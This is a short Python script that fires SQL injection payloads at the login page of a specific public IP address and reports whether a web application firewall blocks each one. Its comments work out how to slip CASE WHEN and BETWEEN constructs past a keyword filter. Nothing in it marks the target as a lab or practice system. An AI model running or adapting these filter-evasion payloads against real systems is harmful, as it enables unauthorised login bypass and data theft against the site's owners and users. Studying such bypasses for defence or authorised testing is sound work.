import requests

def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": payload, "password": "x"},
                       allow_redirects=False)
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:45}] status={r.status_code} loc={r.headers.get('Location')} waf={waf}")

test("admin'ELSE", "else-alone")

# CASE WHEN using BETWEEN instead of = or >
test("admin' CASE WHEN 1 BETWEEN 0 AND 2 THEN 1 ELSE 0 END", "case-between-and")
# AND is blocked though - avoid it. Use BETWEEN without AND keyword isn't valid SQL syntax (BETWEEN x AND y needs AND)
# So test if 'AND' inside BETWEEN clause specifically is still blocked
test("admin' 1 BETWEEN 0 AND 2", "between-with-and")
test("admin' CASE WHEN 1>0 THEN 1 END", "case-when-gt-then")
test("' CASE WHEN 1>0 THEN 1 END -- ", "case-when-gt-then-nouser")
